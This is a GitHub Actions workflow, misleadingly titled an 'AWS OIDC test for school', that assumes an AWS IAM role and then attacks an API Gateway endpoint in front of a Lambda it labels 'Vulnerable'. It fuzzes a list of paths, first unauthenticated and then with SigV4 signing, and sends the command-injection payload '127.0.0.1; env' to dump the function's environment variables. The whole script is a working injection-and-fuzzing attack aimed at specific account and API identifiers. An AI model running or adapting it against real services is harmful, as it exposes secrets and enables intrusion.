name: AWS OIDC test for school standart old code procedure

on:
  push:
    branches:
      - corgi

permissions:
  id-token: write
  contents: read

jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - name: Configure AWS Credentials
        uses: aws-actions/configure-aws-credentials@v4
        with:
          role-to-assume: arn:aws:iam::009661764077:role/cicdRole
          aws-region: us-east-1

      - name: Invoke Vulnerable Lambda
        run: |
          API_ID="3q931syi7b"
          REGION="us-east-1"
          BASE_URL="https://${API_ID}.execute-api.${REGION}.amazonaws.com/dev"
          PAYLOAD='{"domain": "127.0.0.1; env"}'

          # Common API path names
          PATHS=("" "/" "/nslookup" "/lookup" "/dns" "/api" "/v1" "/v2" "/cmd" "/query" "/run")

          echo "=== 1. FUZZING UNAUTHENTICATED PATHS ==="
          for PATH_NAME in "${PATHS[@]}"; do
            URL="${BASE_URL}${PATH_NAME}"
            echo "POST $URL"
            RES=$(curl -s -X POST "$URL" -H "Content-Type: application/json" -d "$PAYLOAD")
            echo "   Response: $RES"
          done

          echo ""
          echo "=== 2. TESTING WITH IAM SIGV4 SIGNING ==="
          for PATH_NAME in "${PATHS[@]}"; do
            URL="${BASE_URL}${PATH_NAME}"
            echo "SIGNED POST $URL"
            RES=$(curl -s -X POST "$URL" \
              --aws-sigv4 "aws:amz:${REGION}:execute-api" \
              --user "${AWS_ACCESS_KEY_ID}:${AWS_SECRET_ACCESS_KEY}" \
              -H "x-amz-security-token: ${AWS_SESSION_TOKEN}" \
              -H "Content-Type: application/json" \
              -d "$PAYLOAD")
            echo "   Response: $RES"
          done
